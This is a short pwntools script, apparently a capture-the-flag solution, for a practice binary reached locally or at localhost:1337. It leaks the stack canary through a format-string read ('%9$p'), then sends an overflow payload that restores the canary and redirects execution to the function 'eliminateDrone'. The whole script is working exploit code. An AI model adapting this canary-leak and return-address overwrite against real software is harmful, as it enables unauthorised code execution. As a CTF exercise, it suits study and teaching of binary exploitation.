from pwn import *

binary = args.BIN

e = context.binary = ELF(binary)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("localhost", 1337)
    else:
        return process(e.path, stdin=PTY)


p = start()

p.recvuntil(b'>>> ')
p.sendline(b'1')
p.recvuntil(b'>>> ')
p.sendline(b'%9$p')

canary = int(p.recvline().strip(), 16)
print(hex(canary))

p.sendline(b'2')
payload = flat(
  b'a'*10,
  canary, b'a'*8,
  e.sym['eliminateDrone']
)
p.sendline(payload)
print(p.recvall().decode())